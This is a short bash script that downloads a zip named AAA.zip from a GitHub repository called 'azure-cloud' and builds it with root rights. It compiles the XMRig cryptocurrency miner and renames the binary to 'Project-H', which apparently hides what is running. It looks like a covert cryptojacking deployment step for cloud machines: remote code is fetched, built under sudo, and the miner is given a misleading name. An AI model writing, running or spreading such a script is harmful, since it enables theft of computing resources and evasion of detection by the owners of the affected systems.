#!/bin/bash
if [ ! -e "AAA" ]; then
	sudo apt-get update
	sudo apt-get --assume-yes install build-essential cmake libuv1-dev libssl-dev libhwloc-dev git unzip
	sudo wget https://github.com/U117A/azure-cloud/raw/master/AAA.zip
	sudo unzip AAA.zip
	sudo rm -rf AAA.zip
	cd AAA
	mkdir build
	cd build
	cmake ..
	make
	sudo mv xmrig Project-H
else
	sudo rm -rf AAA
fi
